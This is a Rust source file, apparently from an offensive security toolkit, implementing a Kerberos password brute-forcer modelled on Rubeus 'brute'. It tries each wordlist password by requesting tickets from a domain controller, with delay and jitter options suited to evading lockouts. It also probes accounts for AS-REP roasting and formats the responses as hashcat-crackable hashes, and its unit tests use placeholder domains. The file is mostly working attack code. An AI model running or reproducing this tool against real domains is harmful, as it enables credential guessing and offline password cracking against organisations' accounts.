//! AS-REQ brute-force (Rubeus `brute`) implementation.

use crate::proto::kerberos;
use chrono::Utc;
use kerberos_asn1::Asn1Object;
use kerberos_asn1::{
    AsRep, AsReq, KdcReqBody, KerberosFlags, KerberosTime, KrbError, PrincipalName,
};
use serde::{Deserialize, Serialize};
use std::fmt;
use std::time::{Duration, Instant};
use thiserror::Error;
use tokio::fs;
use tokio::time::sleep;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberosBruteConfig {
    pub dc_ip: String,
    pub domain: String,
    pub username: String,
    pub password_list: Vec<String>,
    #[serde(default)]
    pub delay_ms: u64,
    #[serde(default)]
    pub jitter_ms: u64,
    #[serde(default = "default_true")]
    pub stop_on_success: bool,
    pub output_file: Option<String>,
    #[serde(default)]
    pub asrep_only: bool,
}
fn default_true() -> bool {
    true
}
impl Default for KerberosBruteConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            username: String::new(),
            password_list: Vec::new(),
            delay_ms: 0,
            jitter_ms: 0,
            stop_on_success: true,
            output_file: None,
            asrep_only: false,
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ValidCredential {
    pub username: String,
    pub password: String,
    pub hashcat_format: Option<String>,
    pub is_asrep: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct KerberosBruteResult {
    pub valid_credentials: Vec<ValidCredential>,
    pub asrep_roastable: Vec<String>,
    pub attempted: usize,
    pub elapsed_seconds: f64,
}

impl fmt::Display for KerberosBruteResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "attempted={} valid={} asrep={}",
            self.attempted,
            self.valid_credentials.len(),
            self.asrep_roastable.len()
        )
    }
}

#[derive(Error, Debug, Clone)]
pub enum KerberosBruteError {
    #[error("Network error: {0}")]
    NetworkError(String),
    #[error("Protocol error: {0}")]
    ProtocolError(String),
    #[error("Wordlist error: {0}")]
    WordlistError(String),
    #[error("I/O error: {0}")]
    IoError(String),
}

pub async fn brute_kerberos(
    config: &KerberosBruteConfig,
) -> Result<KerberosBruteResult, KerberosBruteError> {
    let start = Instant::now();
    let mut result = KerberosBruteResult::default();
    let username = kerberos::normalize_username(&config.username).to_string();
    let asrep_hash = if config.asrep_only {
        check_asrep_roastable(&config.dc_ip, &username, &config.domain).await?
    } else {
        None
    };
    if let Some(hash) = asrep_hash {
        result.asrep_roastable.push(username.clone());
        result.valid_credentials.push(ValidCredential {
            username: username.clone(),
            password: String::new(),
            hashcat_format: Some(hash),
            is_asrep: true,
        });
        result.elapsed_seconds = start.elapsed().as_secs_f64();
        if config.stop_on_success {
            return save_and_return(config, result).await;
        }
    }
    for (idx, password) in config.password_list.iter().enumerate() {
        if idx > 0 && (config.delay_ms > 0 || config.jitter_ms > 0) {
            let jitter = if config.jitter_ms > 0 {
                rand::random::<u64>() % (config.jitter_ms + 1)
            } else {
                0
            };
            sleep(Duration::from_millis(config.delay_ms + jitter)).await;
        }
        result.attempted += 1;
        if kerberos::request_tgt(&config.dc_ip, &config.domain, &username, password, false)
            .await
            .is_ok()
        {
            result.valid_credentials.push(ValidCredential {
                username: username.clone(),
                password: password.clone(),
                hashcat_format: None,
                is_asrep: false,
            });
            if config.stop_on_success {
                break;
            }
        }
    }
    result.elapsed_seconds = start.elapsed().as_secs_f64();
    save_and_return(config, result).await
}

pub async fn brute_kerberos_from_wordlist(
    config: &KerberosBruteConfig,
    path: &str,
) -> Result<KerberosBruteResult, KerberosBruteError> {
    let contents = fs::read_to_string(path)
        .await
        .map_err(|e| KerberosBruteError::IoError(e.to_string()))?;
    let passwords: Vec<String> = contents
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();
    if passwords.is_empty() {
        return Err(KerberosBruteError::WordlistError(format!(
            "No passwords in {path}"
        )));
    }
    let mut config = config.clone();
    config.password_list = passwords;
    brute_kerberos(&config).await
}

pub fn parse_asrep_to_hashcat(asrep_bytes: &[u8], username: &str, domain: &str) -> Option<String> {
    let (_, as_rep) = AsRep::parse(asrep_bytes).ok()?;
    let etype = as_rep.enc_part.etype;
    let cipher = &as_rep.enc_part.cipher;
    let checksum_len = if etype == 23 { 16 } else { 12 };
    if cipher.len() < checksum_len {
        return None;
    }
    let (checksum, edata2) = cipher.split_at(checksum_len);
    Some(format!(
        "$krb5asrep${}${}@{}:{}${}",
        etype,
        username,
        domain.to_uppercase(),
        hex::encode(checksum),
        hex::encode(edata2)
    ))
}

async fn check_asrep_roastable(
    dc_ip: &str,
    username: &str,
    domain: &str,
) -> Result<Option<String>, KerberosBruteError> {
    let realm = kerberos::normalize_realm(domain);
    let etypes = vec![
        kerberos::ETYPE_RC4_HMAC,
        kerberos::ETYPE_AES256_CTS,
        kerberos::ETYPE_AES128_CTS,
    ];
    let req_body = KdcReqBody {
        kdc_options: KerberosFlags {
            flags: kerberos::KDC_OPT_FORWARDABLE
                | kerberos::KDC_OPT_RENEWABLE
                | kerberos::KDC_OPT_CANONICALIZE
                | kerberos::KDC_OPT_RENEWABLE_OK,
        },
        cname: Some(PrincipalName {
            name_type: kerberos::NT_PRINCIPAL,
            name_string: vec![username.to_string()],
        }),
        realm: realm.clone(),
        sname: Some(PrincipalName {
            name_type: kerberos::NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        }),
        from: None,
        till: KerberosTime::from(Utc::now() + chrono::Duration::hours(10)),
        rtime: Some(KerberosTime::from(Utc::now() + chrono::Duration::hours(10))),
        nonce: rand::random::<u32>(),
        etypes,
        addresses: None,
        enc_authorization_data: None,
        additional_tickets: None,
    };
    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: None,
        req_body,
    };
    let response = kerberos::kdc_exchange(dc_ip, &as_req.build())
        .await
        .map_err(|e| KerberosBruteError::NetworkError(e.to_string()))?;
    if let Ok((_, _as_rep)) = AsRep::parse(&response) {
        return Ok(parse_asrep_to_hashcat(&response, username, &realm));
    }
    if KrbError::parse(&response).map(|(_, err)| err.error_code) == Ok(25) {
        return Ok(None);
    }
    Ok(None)
}

async fn save_and_return(
    config: &KerberosBruteConfig,
    result: KerberosBruteResult,
) -> Result<KerberosBruteResult, KerberosBruteError> {
    if let Some(path) = &config.output_file {
        let data = serde_json::to_string_pretty(&result)
            .map_err(|e| KerberosBruteError::IoError(e.to_string()))?;
        fs::write(path, data)
            .await
            .map_err(|e| KerberosBruteError::IoError(e.to_string()))?;
    }
    Ok(result)
}

#[cfg(test)]
mod tests {
    use super::*;
    use kerberos_asn1::{EncryptedData, Ticket};

    #[test]
    fn test_config_default() {
        let c = KerberosBruteConfig::default();
        assert!(c.stop_on_success);
        assert!(!c.asrep_only);
        assert_eq!(c.delay_ms, 0);
        assert!(c.password_list.is_empty());
    }
    #[test]
    fn test_config_custom() {
        let c = KerberosBruteConfig {
            dc_ip: "1.2.3.4".into(),
            domain: "CORP.LOCAL".into(),
            username: "admin".into(),
            password_list: vec!["pass".into()],
            delay_ms: 100,
            jitter_ms: 50,
            stop_on_success: false,
            output_file: Some("/tmp/out.json".into()),
            asrep_only: true,
        };
        assert_eq!(c.dc_ip, "1.2.3.4");
        assert!(!c.stop_on_success);
        assert!(c.asrep_only);
    }
    #[test]
    fn test_result_display() {
        let r = KerberosBruteResult {
            attempted: 10,
            valid_credentials: vec![ValidCredential::default()],
            ..Default::default()
        };
        assert_eq!(r.to_string(), "attempted=10 valid=1 asrep=0");
    }
    #[test]
    fn test_error_display() {
        assert_eq!(
            KerberosBruteError::NetworkError("down".into()).to_string(),
            "Network error: down"
        );
    }
    #[test]
    fn test_error_debug() {
        assert!(
            format!("{:?}", KerberosBruteError::ProtocolError("bad".into()))
                .contains("ProtocolError")
        );
    }
    #[test]
    fn test_valid_credential_serialization() {
        let v = ValidCredential {
            username: "admin".into(),
            password: "secret".into(),
            hashcat_format: Some("hash".into()),
            is_asrep: true,
        };
        let s = serde_json::to_string(&v).unwrap();
        assert!(s.contains("\"username\":\"admin\""));
        assert!(s.contains("\"is_asrep\":true"));
    }
    #[tokio::test]
    async fn test_brute_empty_list() {
        let r = brute_kerberos(&KerberosBruteConfig::default())
            .await
            .unwrap();
        assert_eq!(r.attempted, 0);
        assert!(r.valid_credentials.is_empty());
    }
    #[test]
    fn test_hashcat_format() {
        let realm = "CORP.LOCAL";
        let ticket = Ticket::new(
            realm.into(),
            PrincipalName {
                name_type: kerberos::NT_SRV_INST,
                name_string: vec!["krbtgt".into(), realm.into()],
            },
            EncryptedData::new(23, None, vec![0xAB; 16]),
        );
        let as_rep = AsRep::new(
            None,
            realm.into(),
            PrincipalName {
                name_type: kerberos::NT_PRINCIPAL,
                name_string: vec!["admin".into()],
            },
            ticket,
            EncryptedData::new(23, None, vec![0xAB; 32]),
        );
        let hash = parse_asrep_to_hashcat(&as_rep.build(), "admin", "corp.local").unwrap();
        assert!(hash.starts_with("$krb5asrep$23$admin@CORP.LOCAL:"));
    }
}
